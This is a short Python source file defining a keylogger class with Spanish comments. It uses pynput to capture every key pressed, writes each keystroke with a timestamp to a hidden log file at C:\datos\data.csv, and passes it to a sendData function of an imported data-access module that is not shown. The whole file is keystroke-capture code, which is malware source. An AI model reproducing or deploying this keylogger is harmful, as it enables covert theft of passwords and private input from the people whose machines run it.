from pynput.keyboard import Key, Listener
from dao import *
import getpass
import sys, logging
import time, datetime
import os
from time_manager import *
class Keylogger:
    
    @staticmethod
    def detectarTeclaPresionada(key):
        Keylogger.ingresarTeclaPresionada(key)

    @staticmethod
    def ingresarTeclaPresionada(key):
        # Funcion que inserta la tecla pulsada al archivo Log
        logging.info(str(key)) 
        Dao.sendData(str(key).replace("'",""))
    

    @staticmethod
    def crearArchivo():
        # Archivo log donde se guardan los caracteres
        ruta = r'C:\\datos' 
        if not os.path.exists(ruta):
            os.makedirs(ruta)
        ruta_log = "c:\\datos\\data.csv"
        logging.basicConfig(filename = (ruta_log), level = logging.DEBUG, format='%(asctime)s, %(message)s',
        datefmt="%Y-%m-%d %H:%M:%S")


        
        